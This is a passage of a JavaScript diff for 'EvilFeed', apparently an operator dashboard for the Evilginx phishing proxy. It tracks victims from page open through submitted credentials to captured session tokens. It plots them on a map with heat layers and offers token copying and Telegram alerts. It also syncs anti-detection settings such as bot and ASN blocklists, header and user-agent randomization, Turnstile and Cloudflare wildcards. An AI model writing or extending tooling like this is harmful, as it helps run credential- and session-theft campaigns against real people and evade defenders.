+        activityFeed() {
+          const merged = [...this.logEvents, ...this.events];
+          return merged.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
+        },
+        addNotification(event) {
+          const now = Date.now();
+          if (this.dndUntil && now < this.dndUntil) return;
+          if (!event.type || !['session', 'credentials', 'bot', 'click', 'open'].includes(event.type)) {
+            return;
+          }
+          if (!this.notifyPrefs[event.type]) return;
+          this.notifications.unshift({
+            id: event.id || Date.now() + Math.random(),
+            title: event.type === 'session' ? 'Captured Session' :
+                   event.type === 'credentials' ? 'Credentials Submitted' :
+                   event.type === 'bot' ? 'Bot/Blocked' :
+                   event.type === 'click' ? 'Link Clicked' : 'Opened',
+            who: event.username || event.ip || 'Unknown',
+            phishlet: event.phishlet || 'n/a',
+            when: event.timestamp || Date.now(),
+            type: event.type
+          });
+          if (this.notifications.length > 50) this.notifications.pop();
+        },
+
+        connectWS() {
+          const protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+          const ws = new WebSocket(`${protocol}//${location.host}/ws`);
+          
+          ws.onopen = () => {
+              this.connected = true;
+              console.log("Connected to EvilFeed");
+          };
+
+          ws.onmessage = (e) => {
+            try {
+                const event = JSON.parse(e.data);
+                if (!event.id) event.id = Date.now() + Math.random();
+                if (!event.timestamp) event.timestamp = Date.now();
+                
+                // Handle legacy format
+                if (!event.type && event.event) {
+                    if (event.event.includes("Session")) event.type = 'session';
+                    else if (event.event.includes("Submitted")) event.type = 'credentials';
+                    else if (event.event.includes("Clicked")) event.type = 'click';
+                    else event.type = 'open';
+                }
+
+                if (event.type === 'log') {
+                    this.logEvents.unshift(event);
+                    if (this.logEvents.length > 200) this.logEvents.pop();
+                } else {
+                    this.events.unshift(event);
+                    if (this.events.length > 100) this.events.pop();
+
+                    this.updateStats(event);
+                    this.addMarker(event);
+                    this.updateHeatLayer();
+                    this.addNotification(event);
+                    
+                    // Play sound
+                    if (!this.muted && this.notifyPrefs[event.type] && (event.type === 'session' || event.type === 'credentials')) {
+                        const audio = document.getElementById('alert');
+                        if (audio) { audio.currentTime = 0; audio.play().catch(e => {}); }
+                    }
+                }
+            } catch (err) { console.error(err); }
+          };
+          
+          ws.onclose = () => {
+              this.connected = false;
+              setTimeout(() => this.connectWS(), 2000);
+          };
+        },
+
+       initMap() {
+         if (this.map || !document.getElementById('map')) {
+            return;
+         }
+         this.map = L.map('map', { zoomControl: false, attributionControl: false }).setView([20, 0], 1);
+         L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', { maxZoom: 19 }).addTo(this.map);
+            this.cluster = L.markerClusterGroup({ showCoverageOnHover: false, maxClusterRadius: 50 });
+            this.map.addLayer(this.cluster);
+          },
+
+       // Get marker color based on event stage
+       getMarkerColor(type) {
+          const colors = {
+            'session': '#d946ef',     // Purple - Session/tokens captured (highest value)
+            'credentials': '#eab308', // Yellow/Gold - Credentials submitted
+            'click': '#3b82f6',       // Blue - Link clicked
+            'open': '#22c55e',        // Green - Page opened/visited
+            'bot': '#ef4444'          // Red - Bot detected/failed
+          };
+          return colors[type] || '#6b7280'; // Gray for unknown
+       },
+
+       // Add small random offset to prevent marker stacking
+       jitterCoords(lat, lon) {
+          // Add random offset within ~500m radius for visual separation
+          const jitter = 0.005; // ~500m at equator
+          return [
+            lat + (Math.random() - 0.5) * jitter,
+            lon + (Math.random() - 0.5) * jitter
+          ];
+       },
+
+       addMarker(e) {
+          if (this.map && this.cluster && e.geo && e.geo.lat && e.geo.lon) {
+            const color = this.getMarkerColor(e.type);
+            const [jLat, jLon] = this.jitterCoords(e.geo.lat, e.geo.lon);
+
+            // Create pulsing dot for recent events (< 5 min old)
+            const isRecent = e.timestamp && (Date.now() - e.timestamp) < 300000;
+            const pulseClass = isRecent ? 'marker-pulse' : '';
+
+            const icon = L.divIcon({
+              className: 'cluster-dot ' + pulseClass,
+              html: `<div style="background:${color};width:12px;height:12px;border-radius:50%;border:2px solid rgba(255,255,255,0.5);box-shadow:0 0 6px ${color}"></div>`,
+              iconSize: [12,12]
+            });
+
+            const marker = L.marker([jLat, jLon], { icon });
+
+            // Enhanced popup with stage info
+            const stageLabels = {
+              'session': '🟣 Session Captured',
+              'credentials': '🟡 Credentials Submitted',
+              'click': '🔵 Link Clicked',
+              'open': '🟢 Page Visited',
+              'bot': '🔴 Bot Detected'
+            };
+            const stageLabel = stageLabels[e.type] || e.type;
+            const timeStr = e.timestamp ? new Date(e.timestamp).toLocaleString() : 'Unknown';
+
+            marker.bindPopup(`
+              <div style="color:#000;min-width:180px;font-size:12px;">
+                <div style="font-weight:bold;margin-bottom:4px;font-size:13px;">${stageLabel}</div>
+                <div><strong>IP:</strong> ${e.ip || 'Unknown'}</div>
+                ${e.username ? `<div><strong>User:</strong> ${e.username}</div>` : ''}
+                <div><strong>Phishlet:</strong> ${e.phishlet || 'Unknown'}</div>
+                <div><strong>Location:</strong> ${e.geo.city || 'Unknown'}, ${e.geo.country || ''}</div>
+                ${e.rid ? `<div><strong>RID:</strong> ${e.rid}</div>` : ''}
+                <div style="color:#666;font-size:10px;margin-top:4px;">${timeStr}</div>
+              </div>
+            `);
+
+            this.cluster.addLayer(marker);
+          }
+       },
+        updateHeatLayer() {
+          if (!this.map) return;
+          if (this.heatLayer) {
+            this.map.removeLayer(this.heatLayer);
+            this.heatLayer = null;
+          }
+          if (!this.heatmapEnabled) return;
+          const pts = this.filteredEvents()
+            .filter(e => e.geo && e.geo.lat && e.geo.lon)
+            .map(e => [e.geo.lat, e.geo.lon, e.type === 'session' ? 0.9 : e.type === 'credentials' ? 0.7 : 0.5]);
+          if (pts.length) {
+            this.heatLayer = L.heatLayer(pts, { radius: 25, blur: 15, maxZoom: 8 });
+            this.heatLayer.addTo(this.map);
+          }
+        },
+        topPhishlets() {
+          const counts = {};
+          this.filteredEvents().forEach(e => {
+            const name = e.phishlet || 'unknown';
+            counts[name] = (counts[name] || 0) + 1;
+          });
+          return Object.keys(counts).map(k => ({name: k, count: counts[k]})).sort((a,b)=>b.count-a.count);
+        },
+        topIPs() {
+          const counts = {};
+          this.filteredEvents().forEach(e => {
+            if (!e.ip) return;
+            counts[e.ip] = (counts[e.ip] || 0) + 1;
+          });
+          return Object.keys(counts).map(k => ({name: k, count: counts[k]})).sort((a,b)=>b.count-a.count);
+        },
+        timelineBuckets() {
+          const buckets = [];
+          const now = Date.now();
+          const span = 60; // minutes
+          for (let i = 5; i >= 0; i--) {
+            const start = Math.floor((span/6)*(5-i));
+            const end = Math.floor((span/6)*(6-i));
+            buckets.push({label: `${start}-${end}m`, sessions:0, creds:0, clicks:0, opens:0});
+          }
+          this.filteredEvents().forEach(e => {
+            if (!e.timestamp) return;
+            const ageMin = (now - e.timestamp)/60000;
+            const bucketIndex = Math.min(5, Math.max(0, 5 - Math.floor((ageMin/(span/6)))));
+            const b = buckets[bucketIndex];
+            if (e.type === 'session') b.sessions += 8;
+            else if (e.type === 'credentials') b.creds += 8;
+            else if (e.type === 'click') b.clicks += 5;
+            else if (e.type === 'open') b.opens += 3;
+          });
+          return buckets;
+        },
+        funnelStats() {
+          const counts = { open: 0, click: 0, credentials: 0, session: 0 };
+          this.events.forEach(e => {
+            if (!e.type) return;
+            if (counts[e.type] !== undefined) counts[e.type] += 1;
+          });
+          const total = Object.values(counts).reduce((a, b) => a + b, 0) || 1;
+          const pct = (n) => Math.round((n / total) * 100);
+          return {
+            counts,
+            pctOpen: pct(counts.open),
+            pctClick: pct(counts.click),
+            pctCreds: pct(counts.credentials),
+            pctSession: pct(counts.session),
+          };
+        },
+
+        updateStats(e) {
+          this.stats.total++;
+          if (e.type === 'bot') {
+              this.stats.bots++;
+          } else if (e.ip) {
+              if (!this.uniqueIPs.has(e.ip)) {
+                  this.uniqueIPs.add(e.ip);
+                  this.stats.real++;
+              }
+          }
+          if (e.type === 'session') this.stats.sessions++;
+          if (e.type === 'credentials') this.stats.creds++;
+        },
+        botEvents() {
+          return this.events.filter(e => e.type === 'bot');
+        },
+        relatedEvents(evt) {
+          if (!evt) return [];
+          const keyIp = evt.ip;
+          const keyUser = evt.username;
+          return this.events
+            .filter(e => (keyIp && e.ip === keyIp) || (keyUser && e.username === keyUser))
+            .sort((a, b) => (a.timestamp || 0) - (b.timestamp || 0))
+            .slice(-15);
+        },
+        async loadCampaignStats(id) {
+          try {
+            const res = await fetch(`/api/campaign_stats?id=${id}`);
+            if (!res.ok) throw new Error();
+            this.campaignStats = await res.json();
+          } catch (e) {
+            this.campaignStats = null;
+          }
+        },
+        campaignStatPct(key) {
+          if (!this.campaignStats || !this.campaignStats.counts) return 0;
+          const total = Object.values(this.campaignStats.counts).reduce((a, b) => a + b, 0) || 1;
+          return Math.round((this.campaignStats.counts[key] || 0) / total * 100);
+        },
+        openCampaign(c) {
+          this.activeCampaign = c;
+          this.showCampaignModal = true;
+          this.campaignStats = null;
+          this.loadCampaignStats(c.id);
+        },
+        closeCampaignModal() {
+          this.showCampaignModal = false;
+          this.activeCampaign = null;
+        },
+
+        // API Calls
+        async loadVisitors() {
+            try {
+                const res = await fetch('/api/visitors');
+                if (!res.ok) throw new Error();
+                this.visitorData = await res.json();
+            } catch (e) {
+                console.error('loadVisitors failed', e);
+            }
+        },
+        async loadCredentials() {
+            try {
+                const res = await fetch('/api/credentials');
+                if (!res.ok) throw new Error();
+                this.credentialData = await res.json();
+            } catch (e) {
+                console.error('loadCredentials failed', e);
+            }
+        },
+        async loadCampaigns() {
+            try {
+                const res = await fetch('/api/campaigns');
+                if (!res.ok) throw new Error();
+                this.campaignData = await res.json();
+            } catch (e) {
+                console.error('loadCampaigns failed', e);
+            }
+        },
+        async loadSettings() {
+            try {
+                const res = await fetch('/api/settings');
+                if (!res.ok) throw new Error();
+                const serverSettings = await res.json();
+                // Merge server settings
+                this.settings = { ...this.settings, ...serverSettings };
+                // Restore localStorage overrides for enabled states
+                this.restoreSettings();
+            } catch (e) {
+                console.error('loadSettings failed', e);
+                // Still try to restore from localStorage
+                this.restoreSettings();
+            }
+        },
+        async loadWhitelist() {
+            try {
+                const res = await fetch('/api/whitelist');
+                if (!res.ok) throw new Error();
+                this.whitelist = await res.json();
+            } catch (e) {
+                console.error('loadWhitelist failed', e);
+            }
+        },
+        async loadEvents() {
+            try {
+                const res = await fetch('/events');
+                if (!res.ok) throw new Error();
+                const data = await res.json();
+                this.events = data.sort((a,b) => (b.timestamp||0) - (a.timestamp||0)).slice(0, 500);
+                this.recalculateStats();
+                this.refreshMap();
+            } catch (e) {
+                console.error('Failed to load events', e);
+            }
+        },
+        recalculateStats() {
+            // Reset stats
+            this.stats = {sessions: 0, creds: 0, real: 0, bots: 0, total: 0};
+            this.uniqueIPs = new Set();
+
+            // Recalculate from all events
+            this.events.forEach(e => {
+                this.stats.total++;
+                if (e.type === 'bot') {
+                    this.stats.bots++;
+                } else if (e.ip) {
+                    if (!this.uniqueIPs.has(e.ip)) {
+                        this.uniqueIPs.add(e.ip);
+                        this.stats.real++;
+                    }
+                }
+                if (e.type === 'session') this.stats.sessions++;
+                if (e.type === 'credentials') this.stats.creds++;
+            });
+        },
+        refreshMap() {
+            if (!this.cluster) return;
+            this.cluster.clearLayers();
+          this.filteredEvents().forEach(e => this.addMarker(e));
+          this.updateHeatLayer();
+        },
+        async saveSettings() {
+            await fetch('/api/settings', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(this.settings)
+            });
+        },
+        // Turnstile two-way sync functions
+        async syncTurnstileFromEvilginx() {
+            this.turnstileSyncStatus = 'syncing';
+            try {
+                const controller = new AbortController();
+                const timeout = setTimeout(() => controller.abort(), 10000);
+
+                const res = await fetch('/api/turnstile/sync', {
+                    method: 'GET',
+                    signal: controller.signal
+                });
+                clearTimeout(timeout);
+
+                if (!res.ok) {
+                    const text = await res.text();
+                    if (text.includes('offline') || text.includes('unavailable')) {
+                        this.turnstileSyncStatus = 'offline';
+                        return;
+                    }
+                    throw new Error(text || 'Sync failed');
+                }
+
+                const data = await res.json();
+                if (data.site_key || data.secret_key) {
+                    // Update local settings from Evilginx
+                    if (data.site_key) this.settings.turnstile_sitekey = data.site_key;
+                    if (data.secret_key) this.settings.turnstile_secretkey = data.secret_key;
+                    if (data.enabled !== undefined) this.settings.turnstile_enabled = data.enabled;
+                }
+                this.turnstileSyncStatus = 'synced';
+                this.turnstileSyncError = '';
+            } catch (e) {
+                if (e.name === 'AbortError') {
+                    this.turnstileSyncStatus = 'offline';
+                    this.turnstileSyncError = 'Connection timeout - Evilginx may be offline';
+                } else {
+                    this.turnstileSyncStatus = 'error';
+                    this.turnstileSyncError = e.message || 'Sync failed';
+                }
+                console.warn('Turnstile sync error:', e);
+            }
+        },
+        async syncTurnstileToEvilginx() {
+            this.turnstileSyncStatus = 'syncing';
+            try {
+                const controller = new AbortController();
+                const timeout = setTimeout(() => controller.abort(), 15000);
+
+                const res = await fetch('/api/turnstile/push', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        site_key: this.settings.turnstile_sitekey,
+                        secret_key: this.settings.turnstile_secretkey,
+                        enabled: this.settings.turnstile_enabled
+                    }),
+                    signal: controller.signal
+                });
+                clearTimeout(timeout);
+
+                if (!res.ok) {
+                    const text = await res.text();
+                    throw new Error(text || 'Push failed');
+                }
+
+                this.turnstileSyncStatus = 'synced';
+                this.turnstileSyncError = '';
+                // Persist to localStorage
+                this.persistSettings();
+                showToast('Turnstile config pushed to Server successfully!', 'success');
+            } catch (e) {
+                if (e.name === 'AbortError') {
+                    this.turnstileSyncStatus = 'offline';
+                    this.turnstileSyncError = 'Connection timeout';
+                    showToast('Failed to push config: Server may be offline', 'error');
+                } else {
+                    this.turnstileSyncStatus = 'error';
+                    this.turnstileSyncError = e.message || 'Push failed';
+                    showToast('Failed to push config: ' + this.turnstileSyncError, 'error');
+                }
+            }
+        },
+        // Telegram two-way sync functions
+        async syncTelegramFromEvilginx() {
+            this.telegramSyncStatus = 'syncing';
+            try {
+                const controller = new AbortController();
+                const timeout = setTimeout(() => controller.abort(), 10000);
+
+                const res = await fetch('/api/telegram/sync', {
+                    method: 'GET',
+                    signal: controller.signal
+                });
+                clearTimeout(timeout);
+
+                if (!res.ok) {
+                    const text = await res.text();
+                    if (text.includes('offline') || text.includes('unavailable')) {
+                        this.telegramSyncStatus = 'offline';
+                        return;
+                    }
+                    throw new Error(text || 'Sync failed');
+                }
+
+                const data = await res.json();
+                if (data.bot_token || data.chat_id) {
+                    // Update local settings from Evilginx
+                    if (data.bot_token) this.settings.telegram_bot_token = data.bot_token;
+                    if (data.chat_id) this.settings.telegram_chat_id = data.chat_id;
+                    if (data.enabled !== undefined) this.settings.telegram_enabled = data.enabled;
+                }
+                this.telegramSyncStatus = 'synced';
+                this.telegramSyncError = '';
+            } catch (e) {
+                if (e.name === 'AbortError') {
+                    this.telegramSyncStatus = 'offline';
+                    this.telegramSyncError = 'Connection timeout - Evilginx may be offline';
+                } else {
+                    this.telegramSyncStatus = 'error';
+                    this.telegramSyncError = e.message || 'Sync failed';
+                }
+                console.warn('Telegram sync error:', e);
+            }
+        },
+        async syncTelegramToEvilginx() {
+            this.telegramSyncStatus = 'syncing';
+            try {
+                const controller = new AbortController();
+                const timeout = setTimeout(() => controller.abort(), 15000);
+
+                const res = await fetch('/api/telegram/push', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        bot_token: this.settings.telegram_bot_token,
+                        chat_id: this.settings.telegram_chat_id,
+                        enabled: this.settings.telegram_enabled
+                    }),
+                    signal: controller.signal
+                });
+                clearTimeout(timeout);
+
+                if (!res.ok) {
+                    const text = await res.text();
+                    throw new Error(text || 'Push failed');
+                }
+
+                this.telegramSyncStatus = 'synced';
+                this.telegramSyncError = '';
+                // Persist to localStorage
+                this.persistSettings();
+                showToast('Telegram config pushed to Server successfully!', 'success');
+            } catch (e) {
+                if (e.name === 'AbortError') {
+                    this.telegramSyncStatus = 'offline';
+                    this.telegramSyncError = 'Connection timeout';
+                    showToast('Failed to push config: Server may be offline', 'error');
+                } else {
+                    this.telegramSyncStatus = 'error';
+                    this.telegramSyncError = e.message || 'Push failed';
+                    showToast('Failed to push config: ' + this.telegramSyncError, 'error');
+                }
+            }
+        },
+        // Anonymity two-way sync functions
+        async syncAnonymityFromEvilginx() {
+            this.anonymitySyncStatus = 'syncing';
+            try {
+                const controller = new AbortController();
+                const timeout = setTimeout(() => controller.abort(), 10000);
+                const res = await fetch('/api/anonymity/sync', { method: 'GET', signal: controller.signal });
+                clearTimeout(timeout);
+                if (!res.ok) {
+                    const text = await res.text();
+                    if (text.includes('offline') || text.includes('unavailable')) { this.anonymitySyncStatus = 'offline'; return; }
+                    throw new Error(text || 'Sync failed');
+                }
+                const data = await res.json();
+                if (data.enabled !== undefined) this.settings.anonymity_enabled = data.enabled;
+                if (data.header_randomization !== undefined) this.settings.anonymity_header_randomization = data.header_randomization;
+                if (data.useragent_rotation !== undefined) this.settings.anonymity_useragent_rotation = data.useragent_rotation;
+                this.anonymitySyncStatus = 'synced';
+                this.anonymitySyncError = '';
+            } catch (e) {
+                if (e.name === 'AbortError') { this.anonymitySyncStatus = 'offline'; this.anonymitySyncError = 'Connection timeout'; }
+                else { this.anonymitySyncStatus = 'error'; this.anonymitySyncError = e.message || 'Sync failed'; }
+            }
+        },
+        async syncAnonymityToEvilginx() {
+            this.anonymitySyncStatus = 'syncing';
+            try {
+                const controller = new AbortController();
+                const timeout = setTimeout(() => controller.abort(), 15000);
+                const res = await fetch('/api/anonymity/push', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        enabled: this.settings.anonymity_enabled,
+                        header_randomization: this.settings.anonymity_header_randomization,
+                        useragent_rotation: this.settings.anonymity_useragent_rotation
+                    }),
+                    signal: controller.signal
+                });
+                clearTimeout(timeout);
+                if (!res.ok) throw new Error(await res.text() || 'Push failed');
+                this.anonymitySyncStatus = 'synced';
+                this.anonymitySyncError = '';
+                showToast('Anonymity config pushed to Evilginx successfully!', 'success');
+            } catch (e) {
+                if (e.name === 'AbortError') { this.anonymitySyncStatus = 'offline'; showToast('Failed: Evilginx may be offline', 'error'); }
+                else { this.anonymitySyncStatus = 'error'; this.anonymitySyncError = e.message; showToast('Failed: ' + e.message, 'error'); }
+            }
+        },
+        // Cloudflare two-way sync functions
+        async syncCloudflareFromEvilginx() {
+            this.cloudflareSyncStatus = 'syncing';
+            try {
+                const controller = new AbortController();
+                const timeout = setTimeout(() => controller.abort(), 10000);
+                const res = await fetch('/api/cloudflare/sync', { method: 'GET', signal: controller.signal });
+                clearTimeout(timeout);
+                if (!res.ok) {
+                    const text = await res.text();
+                    if (text.includes('offline') || text.includes('unavailable')) { this.cloudflareSyncStatus = 'offline'; return; }
+                    throw new Error(text || 'Sync failed');
+                }
+                const data = await res.json();
+                if (data.api_token) this.settings.cloudflare_api_token = data.api_token;
+                if (data.wildcard_enabled !== undefined) this.settings.cloudflare_wildcard_enabled = data.wildcard_enabled;
+                this.cloudflareSyncStatus = 'synced';
+                this.cloudflareSyncError = '';
+            } catch (e) {
+                if (e.name === 'AbortError') { this.cloudflareSyncStatus = 'offline'; this.cloudflareSyncError = 'Connection timeout'; }
+                else { this.cloudflareSyncStatus = 'error'; this.cloudflareSyncError = e.message || 'Sync failed'; }
+            }
+        },
+        async syncCloudflareToEvilginx() {
+            this.cloudflareSyncStatus = 'syncing';
+            try {
+                const controller = new AbortController();
+                const timeout = setTimeout(() => controller.abort(), 15000);
+                const res = await fetch('/api/cloudflare/push', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        api_token: this.settings.cloudflare_api_token,
+                        wildcard_enabled: this.settings.cloudflare_wildcard_enabled
+                    }),
+                    signal: controller.signal
+                });
+                clearTimeout(timeout);
+                if (!res.ok) throw new Error(await res.text() || 'Push failed');
+                this.cloudflareSyncStatus = 'synced';
+                this.cloudflareSyncError = '';
+                showToast('Cloudflare config pushed to Evilginx successfully!', 'success');
+            } catch (e) {
+                if (e.name === 'AbortError') { this.cloudflareSyncStatus = 'offline'; showToast('Failed: Evilginx may be offline', 'error'); }
+                else { this.cloudflareSyncStatus = 'error'; this.cloudflareSyncError = e.message; showToast('Failed: ' + e.message, 'error'); }
+            }
+        },
+        // Blocklist two-way sync functions
+        async syncBlocklistFromEvilginx() {
+            this.blocklistSyncStatus = 'syncing';
+            try {
+                const controller = new AbortController();
+                const timeout = setTimeout(() => controller.abort(), 10000);
+                const res = await fetch('/api/blocklist/sync', { method: 'GET', signal: controller.signal });
+                clearTimeout(timeout);
+                if (!res.ok) {
+                    const text = await res.text();
+                    if (text.includes('offline') || text.includes('unavailable')) { this.blocklistSyncStatus = 'offline'; return; }
+                    throw new Error(text || 'Sync failed');
+                }
+                const data = await res.json();
+                if (data.enabled !== undefined) this.settings.blocklist_enabled = data.enabled;
+                if (data.verbose !== undefined) this.settings.blocklist_verbose = data.verbose;
+                if (data.asn_file) this.settings.blocklist_asn_file = data.asn_file;
+                if (data.useragent_file) this.settings.blocklist_useragent_file = data.useragent_file;
+                if (data.ip_range_file) this.settings.blocklist_ip_range_file = data.ip_range_file;
+                if (data.ip_list_file) this.settings.blocklist_ip_list_file = data.ip_list_file;
+                this.blocklistSyncStatus = 'synced';
+                this.blocklistSyncError = '';
+            } catch (e) {
+                if (e.name === 'AbortError') { this.blocklistSyncStatus = 'offline'; this.blocklistSyncError = 'Connection timeout'; }
+                else { this.blocklistSyncStatus = 'error'; this.blocklistSyncError = e.message || 'Sync failed'; }
+            }
+        },
+        async syncBlocklistToEvilginx() {
+            this.blocklistSyncStatus = 'syncing';
+            try {
+                const controller = new AbortController();
+                const timeout = setTimeout(() => controller.abort(), 15000);
+                const res = await fetch('/api/blocklist/push', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        enabled: this.settings.blocklist_enabled,
+                        verbose: this.settings.blocklist_verbose,
+                        asn_file: this.settings.blocklist_asn_file,
+                        useragent_file: this.settings.blocklist_useragent_file,
+                        ip_range_file: this.settings.blocklist_ip_range_file,
+                        ip_list_file: this.settings.blocklist_ip_list_file
+                    }),
+                    signal: controller.signal
+                });
+                clearTimeout(timeout);
+                if (!res.ok) throw new Error(await res.text() || 'Push failed');
+                this.blocklistSyncStatus = 'synced';
+                this.blocklistSyncError = '';
+                showToast('Blocklist config pushed to Evilginx successfully!', 'success');
+            } catch (e) {
+                if (e.name === 'AbortError') { this.blocklistSyncStatus = 'offline'; showToast('Failed: Evilginx may be offline', 'error'); }
+                else { this.blocklistSyncStatus = 'error'; this.blocklistSyncError = e.message; showToast('Failed: ' + e.message, 'error'); }
+            }
+        },
+        // Track IP for deduplication
+        trackIP(ip) {
+            if (!ip) return;
+            this.seenIPs.add(ip);
+            // Persist to localStorage (keep max 10000 IPs)
+            if (this.seenIPs.size > 10000) {
+                const arr = Array.from(this.seenIPs);
+                this.seenIPs = new Set(arr.slice(-5000));
+            }
+            localStorage.setItem('seenIPs', JSON.stringify(Array.from(this.seenIPs)));
+        },
+        isNewIP(ip) {
+            return ip && !this.seenIPs.has(ip);
+        },
+        async saveProxySettings() {
+            // Validate proxy settings before enabling
+            if (this.settings.proxy_enabled) {
+                if (!this.settings.proxy_address || this.settings.proxy_address.trim() === '') {
+                    showToast('Please enter a proxy address before enabling', 'error');
+                    this.settings.proxy_enabled = false;
+                    return;
+                }
+                if (!this.settings.proxy_port || this.settings.proxy_port <= 0 || this.settings.proxy_port > 65535) {
+                    showToast('Please enter a valid proxy port (1-65535) before enabling', 'error');
+                    this.settings.proxy_enabled = false;
+                    return;
+                }
+                if (!this.settings.proxy_type) {
+                    this.settings.proxy_type = 'socks5';
+                }
+            }
+            
+            try {
+                const resp = await fetch('/api/settings', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        proxy_type: this.settings.proxy_type,
+                        proxy_address: this.settings.proxy_address,
+                        proxy_port: this.settings.proxy_port,
+                        proxy_username: this.settings.proxy_username,
+                        proxy_password: this.settings.proxy_password,
+                        proxy_enabled: this.settings.proxy_enabled
+                    })
+                });
+                if (resp.ok) {
+                    // Persist proxy settings to localStorage
+                    this.persistSettings();
+                    showToast('Proxy configuration applied successfully!', 'success');
+                } else {
+                    const text = await resp.text();
+                    showToast('Failed to apply proxy: ' + text, 'error');
+                    // Revert enabled state on failure
+                    this.settings.proxy_enabled = false;
+                }
+            } catch (err) {
+                showToast('Error applying proxy: ' + err.message, 'error');
+                this.settings.proxy_enabled = false;
+            }
+        },
+        
+        // Persist settings to localStorage for page reload persistence
+        persistSettings() {
+            const toSave = {
+                telegram_enabled: this.settings.telegram_enabled,
+                turnstile_enabled: this.settings.turnstile_enabled,
+                proxy_enabled: this.settings.proxy_enabled,
+                proxy_type: this.settings.proxy_type,
+                proxy_address: this.settings.proxy_address,
+                proxy_port: this.settings.proxy_port,
+                proxy_username: this.settings.proxy_username,
+                anonymity_enabled: this.settings.anonymity_enabled,
+                anonymity_header_randomization: this.settings.anonymity_header_randomization,
+                anonymity_useragent_rotation: this.settings.anonymity_useragent_rotation,
+                blocklist_enabled: this.settings.blocklist_enabled,
+                blocklist_verbose: this.settings.blocklist_verbose,
+                cloudflare_wildcard_enabled: this.settings.cloudflare_wildcard_enabled
+            };
+            localStorage.setItem('evilfeed_settings', JSON.stringify(toSave));
+        },
+        
+        // Restore settings from localStorage
+        restoreSettings() {
+            try {
+                const saved = localStorage.getItem('evilfeed_settings');
+                if (saved) {
+                    const parsed = JSON.parse(saved);
+                    // Merge saved settings with current (server takes precedence for sensitive data)
+                    if (parsed.telegram_enabled !== undefined) this.settings.telegram_enabled = parsed.telegram_enabled;
+                    if (parsed.turnstile_enabled !== undefined) this.settings.turnstile_enabled = parsed.turnstile_enabled;
+                    if (parsed.proxy_enabled !== undefined) this.settings.proxy_enabled = parsed.proxy_enabled;
+                    if (parsed.proxy_type) this.settings.proxy_type = parsed.proxy_type;
+                    if (parsed.proxy_address) this.settings.proxy_address = parsed.proxy_address;
+                    if (parsed.proxy_port) this.settings.proxy_port = parsed.proxy_port;
+                    if (parsed.proxy_username) this.settings.proxy_username = parsed.proxy_username;
+                    if (parsed.anonymity_enabled !== undefined) this.settings.anonymity_enabled = parsed.anonymity_enabled;
+                    if (parsed.anonymity_header_randomization !== undefined) this.settings.anonymity_header_randomization = parsed.anonymity_header_randomization;
+                    if (parsed.anonymity_useragent_rotation !== undefined) this.settings.anonymity_useragent_rotation = parsed.anonymity_useragent_rotation;
+                    if (parsed.blocklist_enabled !== undefined) this.settings.blocklist_enabled = parsed.blocklist_enabled;
+                    if (parsed.blocklist_verbose !== undefined) this.settings.blocklist_verbose = parsed.blocklist_verbose;
+                    if (parsed.cloudflare_wildcard_enabled !== undefined) this.settings.cloudflare_wildcard_enabled = parsed.cloudflare_wildcard_enabled;
+                }
+            } catch (e) {
+                console.warn('Failed to restore settings from localStorage:', e);
+            }
+        },
+        async addWhitelist() {
+            if(!this.newWhitelistIP) return;
+            await fetch('/api/whitelist', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ip: this.newWhitelistIP})
+            });
+            this.newWhitelistIP = '';
+            this.loadWhitelist();
+        },
+        async removeWhitelist(ip) {
+            await fetch('/api/whitelist', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ip, action: 'remove'})
+            });
+            this.loadWhitelist();
+        },
+        async clearWhitelist() {
+            await fetch('/api/whitelist', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({action: 'clear'})
+            });
+            this.loadWhitelist();
+        },
+        async clearLogs() {
+            if(confirm('Clear all logs?')) {
+                await fetch('/api/logs/clear', { method: 'POST' });
+                this.events = [];
+                this.visitorData = [];
+                this.credentialData = [];
+                this.stats = {sessions:0, creds:0, real:0, bots:0, total:0};
+                this.uniqueIPs.clear();
+            }
+        },
+        async logout() {
+            await fetch('/api/logout', { method: 'POST' });
+            window.location = '/login';
+        },
+
+        // Helpers
+        cardClass(e) { 
+            if (e.type === 'session') return 'border-purple-500 bg-gradient-to-r from-purple-900/20 to-transparent';
+            if (e.type === 'credentials') return 'border-yellow-500 bg-gradient-to-r from-yellow-900/20 to-transparent';
+            if (e.type === 'bot') return 'border-red-500 bg-gradient-to-r from-red-900/20 to-transparent';
+            return 'border-gray-600'; 
+        },
+        borderClass(e) {
+            if (e.type === 'session') return 'border-purple-500';
+            if (e.type === 'credentials') return 'border-yellow-500';
+            if (e.type === 'bot') return 'border-red-500';
+            return 'border-gray-600';
+        },
+        badgeClass(e) { return e.score >= 50 ? 'bg-red-600 text-white' : 'bg-green-600 text-white'; },
+        icon(e) { 
+            if (e.type === 'session') return '🍪'; 
+            if (e.type === 'credentials') return '🔑'; 
+            if (e.type === 'click') return '🖱️';
+            if (e.type === 'bot') return '🤖';
+            if (e.type === 'log') return '📝';
+            return '👁️'; 
+        },
+        formatTime(t) { return t ? new Date(t).toLocaleString() : ''; },
+        formatTimeShort(t) { return t ? new Date(t).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) : ''; },
+        copyTokens(text) {
+            if (!text || text === 'Waiting for update...') {
+                showToast('Nothing to copy', 'warning');
+                return;
+            }
+            const textToCopy = typeof text === 'object' ? JSON.stringify(text, null, 2) : String(text);
+            if (navigator.clipboard && navigator.clipboard.writeText) {
+                navigator.clipboard.writeText(textToCopy).then(() => showToast('Copied!', 'success')).catch(() => this.fallbackCopy(textToCopy));
+            } else {
